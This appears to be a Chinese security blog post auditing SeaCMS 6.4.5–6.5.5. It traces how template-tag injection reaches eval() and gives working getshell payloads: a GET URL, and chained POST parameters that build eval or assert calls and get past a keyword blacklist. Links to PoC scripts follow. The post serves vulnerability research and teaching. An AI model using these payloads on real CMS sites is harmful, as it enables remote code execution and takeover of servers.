---
title: seacms_getshell 篇
tags:
 - 代码审计
 - php
date: 2019-08-17
---





## 1@ 前言

换回我的 **小deepin了**，还是熟悉的味道，哈哈。配好所有之前的环境后，开始审计 ：）

文章撰写时的审计环境：

```
server : phpstudy
system : win10
```



## 2@ seacms 各个版本的 getshell 

### 1. v_6.4.5 前台 getshell

- 漏洞文件 **upload/search.php**

我以为，初学审计的时候可以先看 payload，然后通过给出构造的参数形式了进行顺藤摸瓜。毕竟各大漏洞平台一般较不详细的时候也会给出几条简单的 poc_payload。我们先来看看这个版本的前台 getshell 的 payload。

`http://IP/upload/search.php?searchtype=5&order=}{end if}{if:1)phpinfo();if(1}{end if}`

#### 1.1 恶意 payload 的追踪

​         首先，我们从上面的 payload 可以知晓可控参数为 **searchtype** 和 **order**，我们可以跟着 xdebug 完整的走一遍，较为清楚的了解漏洞存在的原因，和漏洞触发的条件（只列出漏洞相关的部分，相关逻辑功能的完成在这不细究）。

```php
require_once("include/common.php");
require_once(sea_INC."/main.class.php");
```

文件开头包含了两个处理方法与处理参数的文件，其中 GPC 变量的传入的文件就包含在 **common.php**中。

```php
foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
	foreach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);
}
```

这段 **common.php** 文件中的代码，将外部的 GPC 参数进行 php 代码层的赋值。



再回到 **search.php**，来看看漏洞的直接关键点 **echoSearchpage()** 函数。

```php
global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
$order = !empty($order)?$order:time;
```

函数开头将一些变量引用为全局变量，在函数内部使用。由第二句 order 变量的赋值，结合之前的外部变量赋值的方法，我们可以传入 order 参数进行变量覆盖。由 payload 可知，order字段里面是存在关键字眼 **phpinfo()**的，之后一定是经过了一系列的拼接和过滤，得到执行，我们在整个漏洞利用的在这条链里面就要紧盯着 order 参数的 `'成长历程'`。payload中的另一个参数是 searchtype ，赋值为5，所以我们跳转到代码的 65~76行。

```php
if(intval($searchtype)==5)
	{
		$searchTemplatePath = "/templets/".$GLOBALS['cfg_df_style']."/".$GLOBALS['cfg_df_html']."/cascade.html";
		$typeStr = !empty($tid)?intval($tid).'_':'0_';
		$yearStr = !empty($year)?PinYin($year).'_':'0_';
		$letterStr = !empty($letter)?$letter.'_':'0_';
		$areaStr = !empty($area)?PinYin($area).'_':'0_';
		$orderStr = !empty($order)?$order.'_':'0_';
		$jqStr = !empty($jq)?$jq.'_':'0_';
		$cacheName="parse_cascade_".$typeStr.$yearStr.$letterStr.$areaStr.$orderStr; //构建cacheName
		$pSize = getPageSizeOnCache($searchTemplatePath,"cascade","");  //获取输出页面大小
```

这段代码的大致意思是构造好模板文件的文件名，第一句得到构造模板文件的默认格式的文件名

`/templets/default/html/cascade.html`

然后开始拼接模板文件名，由于以上参数传入都为空，则由选择语句知道我们的最终文件名变量 $cacheName为:

`parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_`

**psize** 是输出文件页面的大小，默认在缓存文件里面保存，值为24.

由于其他相关参数都为空，我们直接跟进到文件的第 145 行，来查看模板文件的处理方式。

```php
if($cfg_iscache){
		if(chkFileCache($cacheName)){
			$content = getFileCache($cacheName);
		}else{
			$content = parseSearchPart($searchTemplatePath);
			setFileCache($cacheName,$content);
		}
	}else{
			$content = parseSearchPart($searchTemplatePath);
	}
```

变量 $cfg_iscache 默认传入为 1，所以我们跟进到 **chkFileCache()**函数里面。

- 文件 /upload/include/inc/common_func.php

```php
function chkFileCache($cacheName)
{
	global $cfg_cachetime,$cfg_cachemark;
	$cacheFile=sea_ROOT.'/data/cache/'.$cfg_cachemark.$cacheName.'.inc';
	$mintime = time() - $cfg_cachetime*60;
	if(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile)))){
		return false;
	}else{
		return true;
	}
}
```

这里的逻辑理解的关键点就在这句

`if(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile))))`

我们在这设一个 $test 变量 

 ![1564321031968](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/1.png)

看到这里是返回 false 的，由格式来看，只能是两边的判断式都为假时，最终的布尔值才会为假。所以，file_exists($cacheFile) 是成立的，也就是说，文件`D:/WWW/seacms_v6.4/upload/data/cache/E20121213155816parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_.inc` 存在。但实际上从本地来看，这个文件并不存在，只有一个相似的被截断的文件名 `E20121213155816parse_cascade_0_0_0_0_}{end if} {if` 存在，这是因为出现的 if 后面的冒号将文件名截断。但是 file_exists 函数仍然判断源文件存在。这想来是件很有趣的事情啊，这就引出来对 file_exists() 与 文件关系的讨论。

#####  1.2.1 有趣的 file_exists()  和 ntfs 文件系统

除了上面的那个情况外，还有一个点也能证明这个被截断文件名的文件是真实存在的。

![1564363773307](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/2.png)

 

思考一下：是否存在这种情况，操作系统的文件系统将文件写入的数据流保存到一个位置，但是显示的文件名是以它的命名规则显示，而真正的文件名是与写入数据流相互关联，可以用底层的编程语言打开那个完整文件名的文件，获取数据流？



搜索无果后，在 p 神小密圈发问，得到了师傅们的指导，了解了一下 ntfs 文件系统。

更多关于 ntfs 文件系统中的隐藏流的知识，请见我的另一篇博客：[ntfs 系统中的ADS供选数据流](https://www.59wlx.top/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/)



##### 1.2.2 继续跟踪审计

好了，解决完上面的问题，我们接着来看审计。

当我们第一次构造 payload 进行访问时，是不存在那个模板文件的，那么代码会走到另一个分支。



```php
if($cfg_iscache){
		if(chkFileCache($cacheName)){
			$content = getFileCache($cacheName);
		}else{
			$content = parseSearchPart($searchTemplatePath);
			setFileCache($cacheName,$content);
		}
	}

```



在 chkFileCache() 函数返回 false 后，进入到 else 分支 ,执行获取 $content, 并对搜索的不存在模板文件进行写入。这也是我们之后访问那个模板文件中内容的由来，即可以一次或多次执行 phpinfo()。

```php
function parseSearchPart($templatePath)
{
	global $mainClassObj,$tid;
	$currentTypeId = empty($tid)?0:$tid;
	$content=loadFile(sea_ROOT.$templatePath);
	$content=$mainClassObj->parseTopAndFoot($content);
	$content=$mainClassObj->parseAreaList($content);
	$content=$mainClassObj->parseHistory($content);
	$content=$mainClassObj->parseSelf($content);
	$content=$mainClassObj->parseGlobal($content);
	$content=$mainClassObj->parseMenuList($content,"",$currentTypeId);
	$content=$mainClassObj->parseVideoList($content,$currentTypeId);
	$content=$mainClassObj->parsenewsList($content,$currentTypeId);
	$content=$mainClassObj->parseTopicList($content);
	return $content;
}
```

这个函数获取模板文件的默认格式，然后进行替换赋值。

之后就进入到了关键的模板内容替换的部分：



```php
$content = str_replace("{searchpage:page}",$page,$content);
	echo $content;
	$content = str_replace("{seacms:searchword}",$searchword,$content);
	$content = str_replace("{seacms:searchnum}",$TotalResult,$content);
	$content = str_replace("{searchpage:ordername}",$order,$content);
......
```

我只列出我们可控的部分，关键就在 $order 这个参数，我们结合 $content 获取到的模板文件的内容，来观察替换后的亚子。模板内容如下：

```html
      <a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
      <a href="{searchpage:order-hit-link}" {if:"{searchpage:ordername}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
      <a href="{searchpage:order-score-link}" {if:"{searchpage:ordername}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
 
```

可以看到，模板文件中有3次出现 ordername，这也就可以解释为什么 payload 触发漏洞之后，执行了三次 phpifno()

结合我们的 payload，我们可以知道模板文件替换位置最终的形式如下：

```html
<a href="{searchpage:order-time-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">
```

这里的 `}`,作用就是在 eval 的时候保证逻辑与语法的正确性，保证之后的代码可以被正确执行。

模板文件内容替换后，进入到最最关键的一步：

`$content=$mainClassObj->parseIf($content);`

跟进到 parseIf 函数：

```php
function parseIf($content){
		if (strpos($content,'{if:')=== false){
		return $content;
		}else{
		// echo $content;
		$labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");
		$labelRule2="{elseif";
		$labelRule3="{else}";
		preg_match_all($labelRule,$content,$iar);
		$arlen=count($iar[0]);
		// var_dump($iar[0]);
		$elseIfFlag=false;
		for($m=0;$m<$arlen;$m++){
			$strIf=$iar[1][$m];
			$strIf=$this->parseStrIf($strIf);
			$strThen=$iar[2][$m];
			$strThen=$this->parseSubIf($strThen);
			if (strpos($strThen,$labelRule2)===false){
				if (strpos($strThen,$labelRule3)>=0){
					$elsearray=explode($labelRule3,$strThen);
					$strThen1=$elsearray[0];
					$strElse1=$elsearray[1];
					@eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
```

由正则式可知 $iar[0] 数组得到的是所有满足 `{if:【内容】}【内容】{end if}` 这种形式的匹配结果

回头来看看我们刚刚替换后的关键部分的模板内容：

`<a href="{searchpage:order-time-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="time"}`

是满足匹配规则的，重要内容保存在 $iar[1]中。这里我们直接定位到最终执行 payload 的语句中。

`@eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");`

跟踪 $strIf 变量，经过了两次处理

```php
$strIf=$iar[1][$m];
$strIf=$this->parseStrIf($strIf);
```

上面说过，最终的 payload 关键内容会保存在 $iar[1] 中，所以经过 for 遍历，$strIf 一定可以被赋值为带有 phpinfo() 的字符串。

跟进到 parseStrIf() 函数。

```php
	function parseStrIf($strIf)
	{
		if(strpos($strIf,'=')===false)
		{
			return $strIf;
		}
		if((strpos($strIf,'==')===false)&&(strpos($strIf,'=')>0))
		{
			$strIf=str_replace('=', '==', $strIf);
		}
		$strIfArr =  explode('==',$strIf);
		return (empty($strIfArr[0])?'NULL':$strIfArr[0])."==".(empty($strIfArr[1])?'NULL':$strIfArr[1]);
	}
```

当下我们的 $strIf 为 `1)phpinfo();if(1`

其中没有 **=** ，所以直接返回原内容。所以最后 eval() 函数执行的内容就为

`@eval("if(1)phpinfo();if(1){\$ifFlag=true;}else{\$ifFlag=false;}");`

代码就会顺利得到执行。

这里纠正一下引用文章的一个说法，`$labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");`

这个正则式并不是贪婪匹配，而是使用  **？** 来取消了贪婪匹配。每次只匹配一个结果，并不向后延伸，而匹配到所有结果是函数 **preg_match_all()** 的作用。

#### 1.2 结果分析

这个漏洞利用的十分巧妙。先利用可控变量替换模板中的内容，然后进行模板内容提取，最后正则匹配执行代码。但是说到底，挖掘漏洞的人肯定也是从 eval() 这个危险函数出发，逐步回退，找到可控参数，然后一步步的构造payload，这是典型的一个白盒挖掘漏洞的思路，`回溯参数`的方法。

但是 php7 版本以上此漏洞却不能利用，原因是之前匹配到的 `"` 使得 eval() 函数不能正确执行，导致后面的代码停止执行。

测试代码如下：

```php
<?php
$test = array(1,2,3,'"',"1)phpinfo();if(1");
for ($i=0;$i<5;$i++){
    @eval("if(".$test[$i].") { \$ifFlag=true;} else{ \$ifFlag=false;}");
}
?>
```

php5 下的执行结果

  ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/4.png)

php7 下的执行结果

 ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/5.png)

可以看出，单从 eval() 函数的使用上来说，php7 对于语法的正确性要求更加严格。



### 2、v_6.5.4 前台 getshell

在这个版本的代码中，将上面讲到的 **$order** 变量也进行了特殊字符的检测 

 ![6](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/6.png)



跟进到 RemoveXSS 函数里面，可以看出是一个基于黑名单的 xss 关键字过滤的方法。

```php
function RemoveXSS($val) {  

   $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);  
  
   $search = 'abcdefghijklmnopqrstuvwxyz'; 
   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
   $search .= '1234567890!@#$%^&*()'; 
   $search .= '~`";:?+/={}[]-_|\'\\'; 
   for ($i = 0; $i < strlen($search); $i++) { 
 
      $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); 
      $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; 
   } 
   
   $ra1 = Array('_GET','_POST','_COOKIE','_REQUEST','if:','javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base', 'eval', 'passthru', 'exec', 'assert', 'system', 'chroot', 'chgrp', 'chown', 'shell_exec', 'proc_open', 'ini_restore', 'dl', 'readlink', 'symlink', 'popen', 'stream_socket_server', 'pfsockopen', 'putenv', 'cmd','base64_decode','fopen','fputs','replace','input','contents'); 
   $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); 
   $ra = array_merge($ra1, $ra2); 

    ......
    
   return $val;  
}   
```

其中，黑名单数组的第一组 $ra1 中的第5项添加了 `if:` 这个黑名单匹配项，还加了另外其他的几个匹配项

```
'_GET','_POST','_COOKIE','_REQUEST'
```

所以 v_6.4.5 版本的 payload 会因为逻辑关系的不成立，因此在 eval() 函数中得不到执行。



那么我们来看看这个版本的脑洞版 payload 

```php
文件：
search.php

POST 内容：
searchtype=5
&searchword={if{searchpage:year}
&year=:e{searchpage:area}}
&area=v{searchpage:letter}
&letter=al{searchpage:lang}
&yuyan=(join{searchpage:jq}
&jq=($_P{searchpage:ver}
&ver=OST[9]))
&9[]=ph
&9[]=pinfo();

// 传递拼接为 ：if:eval(join($_POST[9]))
```



因为每个传入的参数限长为 20，所以我们必须尽可能多的使用之后会在模板文件中进行替换的变量进行 payload 的构造。

每一步都会将上一步构造的 payload 进行二次构造，最后传递成为最终等待执行的代码:

```PHP
if:eval(join($_POST[9]))
```



由上一个版本的数据流向，依旧会通过 **parseIf()** 函数，那么最终 eval() 执行恶意函数。这里有两个疑点需要解释。

- 为了防止在 **parseIf** 里面的 eval() 中的 if 语句逻辑错误而不能正常执行，这里构造了 eval(eval(【】)）的结构，使得因为解析顺序，**$_POST** 传来的值会直接进行解释执行。

- 这里只执行了一次 phpinfo() 函数就是第一次替换执行的，第一次的完整的正则匹配如下：

  ```php
  {if:eval(join($_POST[9]))},海洋CMS" />
  <meta name="description" content="{if:eval(join($_POST[9]))},海洋CMS" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  //省略大部分内容
  {end if}
  ```

  由正则匹配和 eval() 函数执行的语句知，最后的执行语句为

  ```php
  @eval("if("eval(join($_POST[9]))"){\$ifFlag=true;}else{\$ifFlag=false;}");
  ```

#### ￥思路分析

如果我们在首次拿到这个系统的代码时，想要找到上面这种利用方式是不太容易的。整个利用思路最最值得借鉴的就是按照 php 的解析顺序，替换顺序来构造 payload ，让多次替换后的 payload 成为最终的 payload。的确骚~



### 3、v6.5.5 前台 getshell

这一版的系统在 parseIf 函数里面进行了危险函数,参数的过滤，但是忽略了 assert 和 $SERVER['QUERY_STRING']。构造方法同上一版，payload 如下。

```php
文件：
search.php

POST 内容：
searchtype=5
&searchword={if{searchpage:year}
&year=:as{searchpage:area}}
&area=s{searchpage:letter}
&letter=ert{searchpage:lang}
&yuyan=($_SE{searchpage:jq}
&jq=RVER{searchpage:ver}
&ver=[QUERY_STRING]));
```

访问如下的 url 即可触发

`http://IP/search.php?phpinfo`

post 内容如上。



## 3@ 总结

可以看见，这款 cms 的修复方法多次使用了黑名单，单独应用在这种场景下还是不容易做出良好的防御。

poc 脚本链接如下：

```
v_6.4.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.45_getshell.py
v_6.5.4: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py
v_6.5.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py
```

